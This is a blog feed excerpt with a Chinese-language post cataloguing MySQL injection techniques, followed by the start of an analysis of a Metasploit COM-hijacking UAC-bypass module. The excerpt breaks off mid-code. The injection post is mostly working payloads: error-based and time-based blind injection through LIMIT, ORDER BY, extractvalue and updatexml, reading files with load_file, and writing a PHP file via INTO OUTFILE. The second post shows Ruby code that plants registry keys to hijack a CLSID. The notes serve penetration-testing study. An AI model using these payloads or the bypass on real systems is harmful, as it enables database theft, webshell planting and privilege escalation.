      
      
        &lt;p&gt;高铁上没事干，把以前的笔记总结一下&lt;br&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ADS&quot;&gt;&lt;a href=&quot;#ADS&quot; class=&quot;headerlink&quot; title=&quot;ADS&quot;&gt;&lt;/a&gt;ADS&lt;/h2&gt;&lt;p&gt;NTFS交换数据流（alternate data streams
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL Injection（持续更新）</title>
    <link href="http://patrilic.top/2019/04/14/MySQL%20Injection/"/>
    <id>http://patrilic.top/2019/04/14/MySQL Injection/</id>
    <published>2019-04-14T15:20:33.000Z</published>
    <updated>2019-04-23T04:26:55.131Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>总结一波MySQL下各式各样等注入技巧～<br><strong>Test Machine Configuration</strong></p><blockquote><p>OS：MacOS Mojave 10.14.2<br>MySQL: MySQL 5.7.19-log</p></blockquote><p>测试表结构：<br><img src="/MySQL Injection.resources/6C53ADB2-2CA5-439F-A4B9-11C003B795A0.png" alt="3dce7ef9e83548ddeb6643a6f075af4f"></p><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>Emmmm，测试失败了<br>翻了一些文章，发现limit之后的analyse() 只适用于<strong>MySQL server version &lt;= 5.6.6</strong></p><p>遂使用 Windows7 x64 + MySQL 5.5.53<br><img src="/MySQL Injection.resources/D3196ADE-0044-4C92-B294-C0F04299F77A.png" alt="26ef60fa552b1e2a9df1c06c0632111b"></p><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">LIMIT</span> &#123;$uid&#125;,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p><p>Limit 注入主要是因为后面有一个 PROCEDURE analyse() 存储过程</p><p>构造报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/MySQL Injection.resources/2575E461-4D29-4818-9593-DCD0A35574D2.png" alt="c4033dbc4df97e555bdc39638d337f21"></p><p>因为5.5版本不能使用SELECT，所以只能获取一些配置信息等</p><p><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>测试语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid &#123;evil&#125;;</span><br></pre></td></tr></table></figure></p><ol><li>Order by + 报错注入<br><img src="/MySQL Injection.resources/68811865-6608-492B-9EA9-618492DCC0D1.png" alt="69d7117a4def2cf4d7d50d4c44b6ae03"></li></ol><ol start="2"><li><p>order by + 时间盲注<br><img src="/MySQL Injection.resources/7E50257D-D914-4605-B905-974ED4AFFDDC.png" alt="68c940c3c115e97f55fcc166249e6d0d"></p></li><li><p>order by + union查询<br><img src="/MySQL Injection.resources/9D8482A7-0738-4C2C-B4F3-071B8CA50E97.png" alt="8635b1761c56ebe9d5b6204f5581517d"></p></li></ol><p>此注入必须使用()包围SQL语句</p><ol start="4"><li>order by + regexp 盲注<br><img src="/MySQL Injection.resources/B5D21FEE-C714-4CD3-846F-CBDA2AF2129A.png" alt="27b6b63f4a93c01d5f57ee0a75c7efea"></li></ol><p>这里解释一下语句<br>当正则未匹配到数据时候返回的结果是0 所以SQL语句相当于<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>排序不变<br><img src="/MySQL Injection.resources/38FFA41A-A8DA-4AE5-ACB7-FD4E5A91F294.png" alt="5a9b7d8ee50c22ed35efa6fb7e90310d"><br><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()) regexp <span class="string">'^aaaaaa'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">3</span>))a);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid) <span class="keyword">union</span> (<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$<span class="keyword">Tables</span>&#125;;</span><br></pre></td></tr></table></figure></p><p>直接嵌套子查询<br><img src="/MySQL Injection.resources/3356D524-EEEE-41BB-A7F6-EA9F38B99273.png" alt="37de6926a8a87e69f143bc5f7597342e"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>版本限制： Version &lt;= 5.5.5<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> ^ <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)), <span class="string">'patrilic'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'String'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())));</span><br></pre></td></tr></table></figure><blockquote><p>extractvalue(target file，xml path)</p></blockquote><p><img src="/MySQL Injection.resources/E0ADE9FD-0F0C-44E7-95D8-30330401643E.png" alt="53bb49c2016af886807088cd58c0709d"><br><img src="/MySQL Injection.resources/4D36E31A-C0BE-4B4C-9657-25BB4BC7E9DA.png" alt="0e204a12a24b48d87710e60dc9b7a104"></p><h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'String'</span>,(<span class="keyword">Select</span> <span class="keyword">user</span>()),<span class="string">'String'</span>));</span><br></pre></td></tr></table></figure><blockquote><p>updatexml(Target file，xml path，updateinfo)</p></blockquote><p><img src="/MySQL Injection.resources/B4AE3D11-4B7E-4285-BFE2-A8DF61A86FCA.png" alt="0786dc9cffd391c4dc9aec2cad9bb334"><br><img src="/MySQL Injection.resources/1AAFC23E-4228-4028-82AB-35DA8054C11A.png" alt="b6cbf8fdd04c44eeaa03b702c00ed273"></p><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/EA30D650-D0A6-4C03-A248-B3E78D259A1A.png" alt="a02097ebcc3c66a348903385c2e09abf"></p><blockquote><p>name_const(‘1’, 14)<br>局限性很大</p></blockquote><h2 id="整数溢出报错注入"><a href="#整数溢出报错注入" class="headerlink" title="整数溢出报错注入"></a>整数溢出报错注入</h2><p>略</p><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (uid,username,<span class="keyword">password</span>,city) <span class="keyword">VALUES</span> (?,?,?,?);</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9C09B58A-2162-4FCF-8988-D8996342E899.png" alt="450be8fc5d042aa1d074506f7d5a93b7"></p><p><img src="/MySQL Injection.resources/4F1A02FF-2B06-4DC8-A883-D1B403287A29.png" alt="f87586d1fd2bcc77a06870c63fd14f28"></p><h2 id="delect"><a href="#delect" class="headerlink" title="delect"></a>delect</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid=&#123;$uid&#125;;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/C12A30AB-E4A6-4FF2-A383-08C1F7C0398E.png" alt="fdf530943ba24e6ec996a845e0b939cb"></p><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">password</span> = &#123;$<span class="keyword">password</span>&#125; <span class="keyword">Where</span> username = &#123;session.user&#125; <span class="keyword">and</span> uid = &#123;session.uid&#125;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/97D8B22C-8B27-4254-9E8B-C288DA88E4FD.png" alt="dcae7f06664c4456708cfdd3159490e9"><br><img src="/MySQL Injection.resources/AA3C9BAB-6ACC-44F4-9FCE-E770566EEFF6.png" alt="84d8c329a9ee3222c4c075648707d4e5"></p><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h2><p>主要用途：写shell<br>要求：</p><ul><li>要求用户具有file权限</li><li>文件不能覆盖写入，所以文件必须为不存在</li><li>如果secure_file_priv非空，则写入文件的目录只能为对应目录下<blockquote><p>into outfile + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span>;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/99802F7E-613B-4F25-8942-026AECDBE222.png" alt="bbeb09b67630a772e19b3b26e4f90b79"></p><blockquote><p>into outfile + LINES TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/B0EEFE16-15A3-4E45-8DA7-616987B525AC.png" alt="0313b6aaee866dee9ee0cc785bc89e7b"></p><blockquote><p>into outfile + FIELDS TERMINATED BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span>  <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/2E99B9C7-7369-4853-9669-7C5D56934A8B.png" alt="922aaffeb4b239df59cf0ddbea8241a2"></p><blockquote><p>into outfile + LINES STARTING BY (limit)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'Y:/123.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span>;</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/1DE8F60F-049E-4760-8B5A-6CB07714C781.png" alt="07ad0be0a19833ec877e9c7d77f0e0bc"></p><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>主要用途：读文件<br>要求：</p><ul><li>要求用户具有file权限</li><li>如果secure_file_priv非空，则只能读取对应目录下的文件<blockquote><p>load_file + UNION</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'Y:/123.php'</span>));</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><img src="/MySQL Injection.resources/72271A75-3061-4252-BE6A-8A25F2D836FF.png" alt="fda87515edd1a870031c33556799b653"></p><blockquote><p>load_file + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/123.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/DDB31E30-84C6-4631-A40C-6A827C57AD55.png" alt="3b346d668d3dab3c2296330ac5421acd"></p><blockquote><p>load_file + extractive<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid=<span class="number">-1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> (<span class="keyword">LOAD_FILE</span>(<span class="string">'Y:/1.php'</span>))),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="/MySQL Injection.resources/4372D4EB-AC68-4E4B-9CD7-A7B7C0577854.png" alt="d068cdb2be5e81cf8ee618282fc0bb8f"></p><blockquote><p>load_file + isnull + updatexml<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>  <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">isnull</span>(<span class="keyword">LOAD_FILE</span>(<span class="string">'D:/1.php'</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p></blockquote><p>存在文件 返回0<br>不存在文件 返回1<br><img src="/MySQL Injection.resources/01D4A547-30E3-465F-A87C-0EA99176FBDF.png" alt="d54a32ed2b31fc6fb134d7275f17eae8"></p><h2 id="Dumpfile"><a href="#Dumpfile" class="headerlink" title="Dumpfile"></a>Dumpfile</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'Hello world!'</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'Y:/world.php'</span>;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9DCC84F2-4346-4F76-A753-2F7813A9DFE7.png" alt="c5c1ec183eb4aba323bedb95d56f2100"></p><h2 id="Case-When"><a href="#Case-When" class="headerlink" title="Case When"></a>Case When</h2><p><img src="/MySQL Injection.resources/QQ20190423-122637@2x.png" alt="QQ20190423-122637@2x.png"></p><h2 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h2><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><h2 id="In"><a href="#In" class="headerlink" title="In"></a>In</h2><p><img src="/MySQL Injection.resources//QQ20190423-122422@2x.png" alt="QQ20190423-122422@2x.png"></p><h2 id="不知道列名的注入"><a href="#不知道列名的注入" class="headerlink" title="不知道列名的注入"></a>不知道列名的注入</h2><p>看原文比较好，直接复现一下<br><img src="/MySQL Injection.resources/1359C87C-0FD0-4CEC-94C2-C7FD53622F20.png" alt="292940479295c820fe09ee52cc66aa61"><br><img src="/MySQL Injection.resources/C5353C73-C707-450C-AB0E-BC841DCDA2C9.png" alt="aa99b8908afbca3697612a580cf940eb"><br><img src="/MySQL Injection.resources/36489756-1393-404C-B72F-64E08CBF6877.png" alt="9dbf0195c2217b9ae5bc52ca52e89fd6"><br><img src="/MySQL Injection.resources/6B13EF6C-92F9-4238-9A6D-D6BBC9DB2A8A.png" alt="232655760d9f318c95d8c69b68f1827f"></p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://www.lucifaer.com/2018/08/13/MySQLi%20Cookbook/" target="_blank" rel="noopener">MySQLi Cookbook</a><br><a href="https://www.cnblogs.com/lcamry/" target="_blank" rel="noopener">lcamry’s blog</a><br><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">报错注入邂逅load_file&amp;into outfile搭讪LINES</a><br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">sqli-extracting-data-without-knowing-columns-name</a><br><a href="https://legacy.gitbook.com/book/wangyihang/sqli-labs/details" target="_blank" rel="noopener">wangyihang-sqli-labs-Script</a><br><a href="https://xz.aliyun.com/t/3992" target="_blank" rel="noopener">史上最水的MYSQL注入总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;Header&quot;&gt;&lt;a href=&quot;#Header&quot; class=&quot;headerlink&quot; title=&quot;Header&quot;&gt;&lt;/a&gt;Header&lt;/h2&gt;&lt;p&gt;总结一波MySQL下各式各样等注入技巧～&lt;br&gt;&lt;strong&gt;Test Mach
      
    
    </summary>
    
    
      <category term="Web Security" scheme="http://patrilic.top/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>bypassUAC_via_comhijacking</title>
    <link href="http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/"/>
    <id>http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/</id>
    <published>2019-04-03T05:12:49.000Z</published>
    <updated>2019-04-03T05:25:50.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Com劫持原理"><a href="#0x01-Com劫持原理" class="headerlink" title="0x01 Com劫持原理"></a>0x01 Com劫持原理</h2><p>利用CLSID搜索顺序：</p><ol><li>HKCU\Software\Classes\CLSID</li><li>HKCR\CLSID</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</li></ol><p>将被劫持的CLSID存入：HKCU\Software\Classes\CLSID</p><p>CLSID 结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   </span><br><span class="line"> &#123;CLSID&#125;       </span><br><span class="line">InprocServer32          (Default) = path          </span><br><span class="line">ThreadingModel     = value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-uacbypass-comhijack分析"><a href="#0x02-uacbypass-comhijack分析" class="headerlink" title="0x02 uacbypass_comhijack分析"></a>0x02 uacbypass_comhijack分析</h2><p>判断系统版本</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span></span></span><br><span class="line">    <span class="keyword">if</span> sysinfo[<span class="string">'OS'</span>] =~ <span class="regexp">/Windows (7|8|10|2008|2012|2016)/</span> &amp;&amp; is_uac_enabled? <span class="comment"># 从meterpreter中判断OS版本</span></span><br><span class="line">      Exploit::CheckCode::Appears</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>劫持点：eventvwr.exe 和 mmc.exe<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@hijack_points = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Event Viewer'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\eventvwr.exe'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Computer Managment'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\mmc.exe'</span>,</span><br><span class="line">      <span class="symbol">cmd_args:</span> <span class="string">'CompMgmt.msc'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijack_com</span><span class="params">(registry_view, dll_path)</span></span></span><br><span class="line">    target = @@hijack_points.sample</span><br><span class="line">    target_clsid = target[<span class="symbol">:class_ids</span>].sample</span><br><span class="line">    root_key = <span class="string">"<span class="subst">#&#123;CLSID_PATH&#125;</span>\\&#123;<span class="subst">#&#123;target_clsid&#125;</span>&#125;"</span></span><br><span class="line">    inproc_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\InProcServer32"</span></span><br><span class="line">    shell_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\ShellFolder"</span></span><br><span class="line"></span><br><span class="line">    registry_createkey(root_key, registry_view)</span><br><span class="line">    registry_createkey(inproc_key, registry_view)</span><br><span class="line">    registry_createkey(shell_key, registry_view)</span><br><span class="line">   </span><br><span class="line">    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'ThreadingModel'</span>, <span class="string">'Apartment'</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'LoadWithoutCOM'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'HideOnDesktop'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span 